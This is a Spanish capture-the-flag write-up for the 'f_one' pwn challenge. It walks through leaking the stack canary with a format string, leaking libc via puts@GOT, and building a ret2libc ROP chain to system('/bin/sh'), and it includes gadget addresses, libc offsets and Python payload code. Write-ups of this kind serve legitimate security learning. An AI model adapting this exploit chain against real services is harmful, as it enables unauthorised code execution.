# f_one - PWN Challenge Solution

## Análisis del Binario

**Archivo**: f_one (ELF 64-bit)  
**Protecciones**:
- Canary: ✓ (pero bypasseable con format string)
- NX: ✓ (necesita ROP)
- PIE: ✗ (direcciones fijas)
- RELRO: ✗

## Vulnerabilidades

### 1. Format String Bug
La función `vuln()` tiene un format string bug en la línea:
```c
printf(buffer);  // Sin format string!
```

Esto permite leer/escribir memoria arbitraria.

### 2. Buffer Overflow
```c
char buffer[64];
fgets(buffer, 108, stdin);  // Lee 108 bytes en buffer de 64!
```

El buffer es de solo 64 bytes pero `fgets` lee hasta 108 bytes, causando overflow.

## Layout del Stack

```
[buffer: 56 bytes]
[canary: 8 bytes]
[saved rbp: 8 bytes]
[return address: 8 bytes]
```

## Estrategia de Explotación

### Paso 1: Leak del Canary
- Usar format string bug: `%13$p` lee el canary del stack
- El offset 13 contiene el valor del canary

### Paso 2: Leak de Libc (Ret2PLT)
- Sobrescribir return address con gadget ROP
- Llamar a `puts(puts@GOT)` para leak la dirección de puts en libc
- Volver a `main` para continuar

### Paso 3: ROP Chain Final
- Calcular direcciones de libc:
  - `libc_base = leaked_puts - puts_offset`
  - `system = libc_base + system_offset`
  - `/bin/sh = libc_base + binsh_offset`
- Construir ROP chain: `system("/bin/sh")`

## Offsets de Libc (GLIBC 2.27)

```python
libc_puts_offset = 0x809c0
libc_system_offset = 0x4f440  
libc_binsh_offset = 0x1b3e9a
```

## Gadgets ROP

```
pop rdi; ret  @ 0x4007f3
ret           @ 0x400566
```

## Payload Final

```python
payload = b'A' * 56          # Padding hasta canary
payload += p64(canary)        # Canary leakeado
payload += b'B' * 8          # Saved RBP  
payload += p64(ret)          # Stack alignment
payload += p64(pop_rdi)      # pop rdi; ret
payload += p64(libc_binsh)   # "/bin/sh"
payload += p64(libc_system)  # system()
```

## Ejecución

```bash
# Contra servidor remoto (requiere que esté activo)
python3 exploit_remote.py

# O con el script automatizado
bash get_flag.sh
```

## Notas Importantes

1. **El servidor debe usar fork()**: Esto mantiene el canary constante entre conexiones
2. **Offsets de libc**: Los offsets pueden variar según la versión exacta de libc
3. **Stack alignment**: El gadget `ret` extra es necesario para alinear el stack a 16 bytes antes de llamar a `system()`

## Estado del Servidor

El servidor `challenges-box1.pwn.tn:1111` no está actualmente accesible (el reto es de 2020). 
El exploit está completo y funcionaría si el servidor estuviera activo con la configuración esperada.